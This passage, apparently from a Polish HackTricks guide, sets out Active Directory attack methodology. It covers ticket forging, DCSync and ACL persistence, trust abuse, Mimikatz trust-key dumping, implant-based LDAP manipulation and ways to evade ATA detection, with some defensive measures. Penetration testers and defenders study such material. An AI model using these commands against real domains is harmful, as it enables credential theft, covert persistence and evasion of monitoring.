**LAPS** zapewnia system zarządzania **lokalnym hasłem Administratora** na komputerach dołączonych do domeny, gwarantując, że jest ono **losowe**, unikatowe i często **zmieniane**. Te hasła są przechowywane w Active Directory, a dostęp kontrolowany jest przez ACLs tylko dla uprawnionych użytkowników. Przy wystarczających uprawnieniach do odczytu tych haseł, możliwe jest pivoting do innych komputerów.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Zbieranie certyfikatów** z skompromitowanej maszyny może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Jeśli skonfigurowane są **podatne szablony**, możliwe jest ich nadużycie w celu eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Po uzyskaniu uprawnień **Domain Admin** lub jeszcze lepiej **Enterprise Admin**, możesz **zrzucić** **bazę domeny**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Niektóre z technik omówionych wcześniej mogą być użyte do persistence.\
Na przykład możesz:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** tworzy **legalny Ticket Granting Service (TGS) ticket** dla konkretnej usługi, używając **NTLM hash** (na przykład **hash konta komputera**). Ta metoda jest stosowana do **uzyskania przywilejów usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Atak **Golden Ticket** polega na uzyskaniu przez atakującego dostępu do **NTLM hash konta krbtgt** w środowisku Active Directory (AD). To konto jest specjalne, ponieważ służy do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, które są niezbędne do uwierzytelniania w sieci AD.

Gdy atakujący zdobędzie ten hash, może tworzyć **TGTs** dla dowolnego konta, które wybierze (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są to jak golden tickets, sfałszowane w sposób, który **omija powszechne mechanizmy wykrywania golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posiadanie certyfikatów konta lub możliwość ich żądania** to bardzo dobry sposób na utrzymanie persistence w koncie użytkownika (nawet jeśli zmieni hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Używanie certyfikatów pozwala również na utrzymanie persistence z wysokimi uprawnieniami w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **uprzywilejowanych grup** (takich jak Domain Admins i Enterprise Admins) poprzez zastosowanie standardowego **Access Control List (ACL)** w tych grupach, aby zapobiec nieautoryzowanym zmianom. Jednak ta funkcja może zostać wykorzystana; jeśli atakujący zmodyfikuje ACL AdminSDHolder, aby nadać pełny dostęp zwykłemu użytkownikowi, użytkownik ten zyska rozległą kontrolę nad wszystkimi uprzywilejowanymi grupami. To zabezpieczenie, mające chronić, może zatem obrócić się przeciwko i umożliwić nieuzasadniony dostęp, jeśli nie jest ściśle monitorowane.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

W każdym **Domain Controller (DC)** istnieje konto **local administrator**. Uzyskując prawa administratora na takiej maszynie, hash lokalnego Administratora można wyodrębnić za pomocą **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **umożliwić użycie tego hasła**, co pozwala na zdalny dostęp do konta lokalnego Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Możesz **nadawać** pewne **specjalne uprawnienia** użytkownikowi względem niektórych obiektów domeny, które pozwolą temu użytkownikowi **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** służą do **przechowywania** **uprawnień**, które **obiekt** posiada **względem** innego **obiektu**. Jeśli możesz wprowadzić nawet **niewielką zmianę** w **security descriptor** obiektu, możesz uzyskać bardzo interesujące uprawnienia do tego obiektu bez potrzeby bycia członkiem uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Nadużyj klasy pomocniczej `dynamicObject`, aby tworzyć krótkotrwałe principals/GPOs/rejestry DNS z `entryTTL`/`msDS-Entry-Time-To-Die`; usuwają się same bez tombstonów, kasując dowody w LDAP przy jednoczesnym pozostawieniu osieroconych SIDów, uszkodzonych referencji `gPLink` lub zbuforowanych odpowiedzi DNS (np. zanieczyszczenie ACE AdminSDHolder lub złośliwe przekierowania `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustanowić **uniwersalne hasło**, dające dostęp do wszystkich kont domenowych.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz stworzyć własne **SSP**, aby **przechwycić** w **czystym tekście** **poświadczenia** używane do dostępu do maszyny.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **wypychania atrybutów** (SIDHistory, SPNs...) na wskazanych obiektach **bez** pozostawiania jakichkolwiek **logów** dotyczących tych **modyfikacji**. Potrzebujesz uprawnień **DA** i musisz być wewnątrz **root domain**.\
Zwróć uwagę, że jeśli użyjesz nieprawidłowych danych, pojawią się dość brzydkie logi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wcześniej omówiliśmy, jak eskalować uprawnienia, jeśli masz **wystarczające uprawnienia do odczytu haseł LAPS**. Jednak te hasła mogą być także użyte do **utrzymania persistence**.\ Zobacz:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft traktuje **Forest** jako granicę bezpieczeństwa. Oznacza to, że **skompromitowanie pojedynczej domeny może potencjalnie prowadzić do kompromitacji całego Forest**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa, który umożliwia użytkownikowi z jednej **domeny** dostęp do zasobów w innej **domenie**. W praktyce tworzy powiązanie między systemami uwierzytelniania obu domen, pozwalając, aby weryfikacje uwierzytelnienia przepływały bezproblemowo. Gdy domeny tworzą trust, wymieniają i przechowują określone **klucze** w swoich **Domain Controllers (DCs)**, które są kluczowe dla integralności zaufania.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **trusted domain**, najpierw musi poprosić o specjalny bilet znany jako **inter-realm TGT** od DC swojej domeny. Ten TGT jest szyfrowany wspólnym **kluczem**, na który zgodziły się obie domeny. Użytkownik następnie przedstawia ten TGT **DC trusted domain**, aby uzyskać bilet serwisowy (**TGS**). Po pomyślnej walidacji inter-realm TGT przez DC trusted domain, wystawia ono **TGS**, przyznając użytkownikowi dostęp do usługi.

**Steps**:

1. Komputer **client** w **Domain 1** rozpoczyna proces, używając swojego **NTLM hash** do żądania **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wydaje nowy TGT, jeśli klient zostanie pomyślnie uwierzytelniony.
3. Klient następnie żąda **inter-realm TGT** od DC1, który jest potrzebny do dostępu do zasobów w **Domain 2**.
4. Inter-realm TGT jest szyfrowany przy użyciu **trust key** współdzielonego między DC1 i DC2 jako części dwukierunkowego trustu domen.
5. Klient zabiera inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 weryfikuje inter-realm TGT używając współdzielonego trust key i, jeśli jest ważny, wydaje **Ticket Granting Service (TGS)** dla serwera w Domain 2, do którego klient chce uzyskać dostęp.
7. W końcu klient przedstawia ten TGS serwerowi, który jest szyfrowany hashem konta serwera, aby uzyskać dostęp do usługi w Domain 2.

### Different trusts

Ważne jest, aby zauważyć, że **trust może być jednokierunkowy lub dwukierunkowy**. W opcji dwukierunkowej obie domeny ufają sobie nawzajem, ale w relacji **jednokierunkowej** jedna z domen będzie **trusted**, a druga **trusting**. W tym ostatnim przypadku **będziesz mógł uzyskać dostęp jedynie do zasobów w trusting domain z trusted domain**.

Jeśli Domain A ufa Domain B, A jest domeną trusting, a B jest domeną trusted. Ponadto, w **Domain A** będzie to **Outbound trust**; a w **Domain B** będzie to **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: To powszechna konfiguracja w obrębie tego samego forest, gdzie domena podrzędna automatycznie ma dwukierunkowy, przechodni trust ze swoją domeną rodzicielską. Oznacza to, że żądania uwierzytelnienia mogą płynąć bezproblemowo między rodzicem a dzieckiem.
- **Cross-link Trusts**: Nazywane również "shortcut trusts", są ustanawiane między domenami podrzędnymi, aby przyspieszyć procesy referencyjne. W złożonych lasach odwołania uwierzytelnienia zwykle muszą iść w górę do root forest, a następnie w dół do docelowej domeny. Tworząc cross-links, skraca się tę drogę, co jest szczególnie korzystne w środowiskach rozproszonych geograficznie.
- **External Trusts**: Ustanawiane między różnymi, niespowinowaconymi domenami i są z natury nieprzechodnie. Zgodnie z [dokumentacją Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts są użyteczne do uzyskiwania dostępu do zasobów w domenie poza bieżącym forest, która nie jest połączona przez forest trust. Bezpieczeństwo jest wzmocnione przez filtrowanie SIDów przy external trusts.
- **Tree-root Trusts**: Te trusty są automatycznie ustanawiane między root domeną forest a nowo dodanym tree root. Chociaż nie są często spotykane, tree-root trusts są istotne przy dodawaniu nowych drzew domen do lasu, umożliwiając im utrzymanie unikalnej nazwy domeny i zapewniając dwukierunkową przechodniość. Więcej informacji można znaleźć w [poradniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ trustu to dwukierunkowy przechodni trust między dwoma root domenami lasu, również wymuszający filtrowanie SIDów w celu wzmocnienia środków bezpieczeństwa.
- **MIT Trusts**: Trusty ustanawiane z nie-Windowsowymi, zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120) domenami Kerberos. MIT trusts są bardziej wyspecjalizowane i przeznaczone do środowisk wymagających integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Other differences in **trusting relationships**

- Relacja zaufania może być także **przechodnia** (A ufa B, B ufa C, więc A ufa C) lub **nieprzechodnia**.
- Relacja zaufania może być skonfigurowana jako **dwukierunkowa** (obie ufają sobie nawzajem) lub jako **jednokierunkowa** (tylko jedna ufa drugiej).

### Attack Path

1. **Enumerate** relacje zaufania
2. Sprawdź, czy jakiś **security principal** (user/group/computer) ma **dostęp** do zasobów **drugiej domeny**, być może poprzez wpisy ACE lub przez członkostwo w grupach drugiej domeny. Szukaj **relacji między domenami** (prawdopodobnie trust został utworzony właśnie z tego powodu).
1. kerberoast w tym przypadku może być kolejną opcją.
3. **Skompromituj** **konta**, które mogą **pivotować** przez domeny.

Atakujący mogą uzyskać dostęp do zasobów w innej domenie poprzez trzy główne mechanizmy:

- **Local Group Membership**: Principals mogą być dodawani do lokalnych grup na maszynach, takich jak grupa “Administrators” na serwerze, dając im znaczną kontrolę nad tą maszyną.
- **Foreign Domain Group Membership**: Principals mogą także być członkami grup w domenie zewnętrznej. Skuteczność tej metody zależy jednak od charakteru trustu i zakresu grupy.
- **Access Control Lists (ACLs)**: Principals mogą być wyspecyfikowani w **ACL**, w szczególności jako podmioty w **ACE** w obrębie **DACL**, przyznając im dostęp do konkretnych zasobów. Dla tych, którzy chcą zagłębić się w mechanikę ACL, DACL i ACE, whitepaper zatytułowany “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” jest nieocenionym źródłem.

### Find external users/groups with permissions

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć foreign security principals w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/forestu**.

Możesz to sprawdzić w **Bloodhound** lub używając powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby na enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 trusted keys**, jedna dla _Child --> Parent_ i druga dla _Parent_ --> _Child_.\
> Możesz sprawdzić, która z nich jest używana przez bieżącą domenę za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalcja do Enterprise admin w domenie child/parent, nadużywając zaufania za pomocą SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zrozumienie, w jaki sposób można wykorzystać Configuration Naming Context (NC), jest kluczowe. Configuration NC służy jako centralne repozytorium danych konfiguracyjnych w całym lesie Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, a zapisywalne DC utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **SYSTEM privileges on a DC**, najlepiej na child DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o site wszystkich komputerów dołączonych do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, atakujący mogą powiązać GPO z root DC sites. To działanie może potencjalnie skompromitować domenę root przez manipulację politykami stosowanymi do tych site'ów.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Wektor ataku obejmuje celowanie w uprzywilejowane gMSA w całym domain. KDS Root key, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, można uzyskać dostęp do KDS Root key i obliczyć hasła dowolnego gMSA w całym lesie.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ta metoda wymaga cierpliwości i oczekiwania na tworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, atakujący może zmodyfikować AD Schema, przyznając dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to prowadzić do nieautoryzowanego dostępu i kontroli nad nowo tworzonymi obiektami AD.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Luka ADCS ESC5 celuje w kontrolę nad obiektami Public Key Infrastructure (PKI), aby utworzyć template certyfikatu umożliwiający uwierzytelnianie się jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, kompromitacja zapisywalnego child DC umożliwia przeprowadzenie ataków ESC5.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **twoja domena jest zaufana** przez domenę zewnętrzną, co daje ci **nieokreślone uprawnienia** wobec niej. Będziesz musiał znaleźć **które podmioty (principals) z twojej domeny mają jaki dostęp do domeny zewnętrznej** i następnie spróbować to wykorzystać:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzny las domenowy - jednokierunkowy (wychodzący)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **twoja domena** ufa pewnym **uprawnieniom** principalowi z **innej domeny**.

Jednakże, kiedy **domena jest zaufana** przez domenę ufającą, zaufana domena **tworzy użytkownika** o **przewidywalnej nazwie**, który jako **hasło używa zaufanego hasła**. Oznacza to, że możliwe jest **uzyskanie dostępu użytkownika z domeny ufającej, aby dostać się do zaufanej domeny** w celu jej enumeracji i próby eskalacji uprawnień:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem na kompromitację zaufanej domeny jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** zaufania domeny (co nie jest zbyt częste).

Innym sposobem kompromitacji zaufanej domeny jest oczekiwanie na maszynie, do której **użytkownik z zaufanej domeny może się zalogować** przez **RDP**. Następnie atakujący może wstrzyknąć kod w proces sesji RDP i **uzyskać dostęp do domeny źródłowej ofiary** stamtąd. Co więcej, jeśli **ofiara zamontowała swój dysk**, z procesu **sesji RDP** atakujący może umieścić **backdoors** w **folderze autostartu dysku**. Ta technika nazywa się **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Łagodzenie nadużyć związanych z zaufaniem domen

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w zaufaniach między lasami jest ograniczone dzięki SID Filtering, który jest domyślnie włączony dla wszystkich zaufani między lasami. Opiera się to na założeniu, że zaufania wewnątrz lasu są bezpieczne, traktując las, a nie domenę, jako granicę bezpieczeństwa zgodnie ze stanowiskiem Microsoft.
- Jednak jest haczyk: SID Filtering może zakłócić działanie aplikacji i dostęp użytkowników, co prowadzi do jego okazjonalnego wyłączenia.

### **Selective Authentication:**

- W przypadku zaufania między lasami, zastosowanie Selective Authentication zapewnia, że użytkownicy z obu lasów nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskać dostęp do domen i serwerów w ramach domeny lub lasu ufającego.
- Warto zauważyć, że te środki nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto zaufania.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Nadużycia AD oparte na LDAP z implantów na hoście

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operatorzy kompilują pakiet poleceniem `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z beacona. Cały ruch korzysta z bieżącego kontekstu bezpieczeństwa logowania przez LDAP (389) z podpisywaniem/sealowaniem lub LDAPS (636) z automatycznym zaufaniem certyfikatu, więc nie są potrzebne socks proxy ani artefakty na dysku.

### Enumeracja LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` rozwiązuje krótkie nazwy/ścieżki OU do pełnych DN i zrzuca odpowiadające obiekty.
- `get-object`, `get-attribute`, and `get-domaininfo` pobierają dowolne atrybuty (w tym security descriptors) oraz metadane lasu/domeny z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` ujawniają kandydatów do roasting, ustawienia delegacji oraz istniejące [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskryptory bezpośrednio z LDAP.
- `get-acl` i `get-writable --detailed` parsują DACL, aby wypisać trustees, prawa (GenericAll/WriteDACL/WriteOwner/zapisy atrybutów) oraz dziedziczenie, dostarczając natychmiastowe cele do eskalacji uprawnień przez ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi przygotować nowe principal'e lub konta maszyn tam, gdzie istnieją prawa do OU. `add-groupmember`, `set-password`, `add-attribute` oraz `set-attribute` bezpośrednio przejmują cele po znalezieniu praw write-property.
- Komendy skupione na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, przekładają WriteDACL/WriteOwner na dowolnym obiekcie AD na reset haseł, kontrolę członkostwa w grupach lub uprawnienia DCSync bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` czyszczą wstrzyknięte ACE.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` natychmiast czynią skompromitowanego użytkownika Kerberoastable; `add-asreproastable` (UAC toggle) oznacza go do AS-REP roasting bez dotykania hasła.
- Makra delegacji (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) przepisują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z beaconu, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę zdalnego PowerShell lub RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` wstrzykuje uprzywilejowane SIDy do sidHistory kontrolowanego principala (zobacz [SID-History Injection](sid-history-injection.md)), zapewniając dyskretne dziedziczenie dostępu całkowicie przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenieść zasoby do OU, gdzie prawa delegowane już istnieją, przed nadużyciem `set-password`, `add-groupmember` lub `add-spn`.
- Ściśle zakresowe polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) pozwalają na szybki rollback po zebraniu poświadczeń lub ustanowieniu persistence, minimalizując telemetrię.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Zaleca się, aby Domain Admins logowali się tylko na Domain Controllers i unikali używania ich na innych hostach.
- **Service Account Privileges**: Usługi nie powinny być uruchamiane z uprawnieniami Domain Admin (DA) w celu utrzymania bezpieczeństwa.
- **Temporal Privilege Limitation**: Dla zadań wymagających uprawnień DA, czas ich trwania powinien być ograniczony. Można to osiągnąć przez: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audytuj Event ID 2889/3074/3075, a następnie wymuś LDAP signing oraz LDAPS channel binding na DC/klientach, aby zablokować próby MITM/relay LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Wdrażanie deception polega na ustawianiu pułapek, jak konta lub komputery-przynęty, z cechami takimi jak hasła, które nigdy nie wygasają lub oznaczone jako Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi prawami lub dodawanie ich do grup o wysokich uprawnieniach.
- Praktyczny przykład to użycie narzędzi takich jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej o wdrażaniu deception znajduje się na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Podejrzane wskaźniki to nietypowe ObjectSID, rzadkie logowania, daty utworzenia i niski licznik błędnych haseł.
- **General Indicators**: Porównywanie atrybutów potencjalnych obiektów-przynęt z prawdziwymi może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pomagają w identyfikacji takich deception.

### **Bypassing Detection Systems**

- **Microsoft ATA — obejście wykrywania**:
- **User Enumeration**: Unikanie enumeracji sesji na Domain Controllers, aby zapobiec wykryciu przez ATA.
- **Ticket Impersonation**: Wykorzystanie kluczy **aes** do tworzenia ticketów pomaga uniknąć wykrycia przez nieobniżanie do NTLM.
- **DCSync Attacks**: Wykonywanie z poza Domain Controller, by uniknąć wykrycia przez ATA — bezpośrednie wykonanie z DC wyzwoli alerty.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
